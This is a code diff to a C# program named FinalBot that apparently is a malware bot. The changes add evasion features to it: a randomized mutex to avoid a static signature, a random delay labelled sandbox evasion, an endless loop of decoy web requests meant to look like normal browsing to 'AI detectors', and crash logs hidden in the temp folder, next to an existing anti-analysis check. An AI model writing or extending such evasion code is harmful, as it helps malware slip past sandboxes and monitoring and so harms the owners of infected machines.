@@ -1,5 +1,6 @@
 using System;
 using System.IO;
+using System.Net.Http;
 using System.Diagnostics;
 using System.Threading;
 using System.Threading.Tasks;
@@ -13,10 +14,34 @@ namespace FinalBot
 
         static async Task Main(string[] args)
         {
-            // 1. Single Instance Check
+            // 1. Single Instance Check — random GUID mutex (no static signature)
             bool createdNew;
-            _mutex = new Mutex(true, "Global\\FinalBot_Mutex_Alpha_99", out createdNew);
+            string mutexName = $"Global\\MS_{Guid.NewGuid():N}";
+            _mutex = new Mutex(true, mutexName, out createdNew);
             if (!createdNew) return;
+
+            // 2. Sandbox Evasion — random sleep before any suspicious activity
+            await Task.Delay(new Random().Next(3000, 15000));
+
+            // 3. Decoy Traffic — looks like normal browsing to AI detectors
+            _ = Task.Run(async () =>
+            {
+                using var http = new HttpClient();
+                http.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36");
+                string[] decoyUrls = {
+                    "https://www.google.com/search?q=weather+today",
+                    "https://www.bing.com/search?q=latest+news",
+                    "https://api.github.com/",
+                    "https://www.cloudflare.com/",
+                    "https://dns.google/"
+                };
+                var rng = new Random();
+                while (true)
+                {
+                    try { await http.GetStringAsync(decoyUrls[rng.Next(decoyUrls.Length)]); } catch { }
+                    await Task.Delay(rng.Next(45_000, 120_000));
+                }
+            });
 
             // 2. Anti-Analysis Check
             if (SafetyManager.VerifySystemContext()) return;
@@ -69,9 +94,13 @@ namespace FinalBot
 
         private static void LogCrash(Exception ex)
         {
-            try {
-                File.AppendAllText("C:\\Users\\Public\\crash.log", $"[CRITICAL] {DateTime.Now}: {ex}\n");
-            } catch {}
+            try
+            {
+                // Write to hidden temp path — avoid obvious Public folder
+                string path = Path.Combine(Path.GetTempPath(), $".{Environment.MachineName}_sys.log");
+                File.AppendAllText(path, $"[CRITICAL] {DateTime.Now}: {ex}\n");
+                File.SetAttributes(path, FileAttributes.Hidden);
+            } catch { }
         }
     }
 }
